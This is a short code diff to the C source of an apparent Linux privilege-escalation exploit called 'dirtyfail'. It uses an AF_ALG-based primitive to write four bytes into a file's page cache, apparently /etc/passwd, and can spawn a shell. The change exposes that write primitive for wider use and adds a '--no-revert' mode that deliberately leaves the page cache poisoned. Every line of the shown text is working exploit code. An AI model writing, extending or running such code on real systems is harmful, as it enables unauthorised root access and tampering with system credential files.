@@ -187,9 +187,9 @@ static bool af_alg_send_aad(int op, const unsigned char four_bytes[4])
  * just means "the syscalls completed". Whether the write actually
  * landed must be confirmed by the caller via a read-back.
  * ---------------------------------------------------------------- */
-static bool cf_4byte_write(const char *target_path,
-                           off_t target_off,
-                           const unsigned char four_bytes[4])
+bool cf_4byte_write(const char *target_path,
+                    off_t target_off,
+                    const unsigned char four_bytes[4])
 {
     int target_fd = open_and_cache(target_path);
     if (target_fd < 0) {
@@ -429,6 +429,11 @@ df_result_t copyfail_exploit(bool do_shell)
     if (p) log_step("getpwnam('%s').pw_uid = %u", user, p->pw_uid);
 
     if (!do_shell) {
+        if (dirtyfail_no_revert) {
+            log_warn("--no-revert: leaving page cache poisoned (run "
+                     "`dirtyfail --cleanup` or reboot to revert)");
+            return DF_EXPLOIT_OK;
+        }
         log_hint("--no-shell selected; reverting page cache");
         if (try_revert_passwd_page_cache())
             log_ok("page cache reverted");
